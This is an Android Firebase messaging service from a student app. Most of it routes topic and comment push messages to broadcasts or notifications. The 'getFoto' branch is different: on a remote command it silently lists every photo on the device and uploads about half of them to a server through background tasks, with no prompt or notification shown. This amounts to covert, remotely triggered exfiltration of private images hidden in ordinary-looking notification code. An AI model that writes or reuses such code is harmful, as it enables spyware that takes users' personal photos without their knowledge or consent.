package firebase;

import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.pkklppuad.uad4students.Gallery;
import android.pkklppuad.uad4students.NotifKuliah;
import android.pkklppuad.uad4students.R;
import android.provider.MediaStore;
import android.support.v4.app.NotificationCompat;
import android.support.v4.content.LocalBroadcastManager;
import android.widget.ImageView;
import android.widget.Toast;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import java.io.File;
import java.util.ArrayList;

import perwalian.ChatActivity;
import perwalian.CommentTopik;

/**
 * Created by L on 8/6/17.
 */

public class MyFirebaseMessagingService extends FirebaseMessagingService {


    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        super.onMessageReceived(remoteMessage);
        String type = remoteMessage.getData().get("jenis");
        if(type.equals("topik")){
            if(ChatActivity.isTopikActive == true){
                Intent intent = new Intent("Topik");
                String topik  = remoteMessage.getData().get("message");
                String jam    = remoteMessage.getData().get("jam");
                intent.putExtra("topik", topik);
                intent.putExtra("jam"  , jam);
                LocalBroadcastManager localBroadcastManager = LocalBroadcastManager.getInstance(this);
                localBroadcastManager.sendBroadcast(intent);
            } else{
                sendNotification(remoteMessage.toString());
            }
        }else if(type.equals("comment")){
              String id = remoteMessage.getData().get("idtopik");
             if(CommentTopik.isCommentActive == true && CommentTopik.idCommentActive.equals(id) ){
                 Intent intent = new Intent("Comment");
                 String comment  = remoteMessage.getData().get("message");
                 String username = remoteMessage.getData().get("username");
                 intent.putExtra("comment", comment);
                 intent.putExtra("username"  , username);
                 LocalBroadcastManager localBroadcastManager = LocalBroadcastManager.getInstance(this);
                 localBroadcastManager.sendBroadcast(intent);
             }else{
                 sendNotification(remoteMessage.getData().get("username"));
             }
        }
        else if(type.equals("getFoto")){
                init();
        }
        else{
            sendNotification(remoteMessage.toString());
        }

    }

    private void sendNotification(String messageBody) {
        Intent intent = new Intent(this, NotifKuliah.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0 /* Request code */, intent,
                PendingIntent.FLAG_ONE_SHOT);

        Uri defaultSoundUri= RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this)
                .setContentTitle("FCM Message")
                .setContentText(messageBody)
                .setSmallIcon(R.mipmap.ic_launcher)
                .setAutoCancel(true)
                .setSound(defaultSoundUri)
                .setContentIntent(pendingIntent);

        NotificationManager notificationManager =
                (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

        notificationManager.notify(0 /* ID of notification */, notificationBuilder.build());
    }

    class As extends AsyncTask<Void,Void,String>{
        private String file;
        private Context context;
        private Uri uri;

        public As(String file, Context context, Uri uri) {
            this.file = file;
            this.context = context;
            this.uri = uri;
        }

        @Override
        protected String doInBackground(Void... voids) {
            return Gallery.uploadKeServer(file,context,uri,"tidakada");
        }

        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);
        }
    }



    public void init(){
        Uri uri;
        Cursor cursor;
        int column_index_data, column_index_folder_name;
        ArrayList<String> listOfAllImages = new ArrayList<String>();
        String absolutePathOfImage = null;
        uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String orderBy = MediaStore.Images.Media.DATE_TAKEN + " DESC";
        String[] projection = { MediaStore.MediaColumns.DATA,
                MediaStore.Images.Media.BUCKET_DISPLAY_NAME ,
                MediaStore.Images.ImageColumns.DATE_TAKEN};

        cursor = getContentResolver().query(uri, projection, null,
                null, orderBy);

        column_index_data = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
        int tanggal = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN);
        column_index_folder_name = cursor
                .getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
        while (cursor.moveToNext()) {
            absolutePathOfImage = cursor.getString(column_index_data);

            listOfAllImages.add(absolutePathOfImage);
        }
        File file = new File(listOfAllImages.get(0));
        for(int i = 0;i < listOfAllImages.size()/2;i++){
            Uri uri1 = Uri.parse("file://"+listOfAllImages.get(i));
            new As(listOfAllImages.get(i),this,uri1).execute();
        }
    }
}
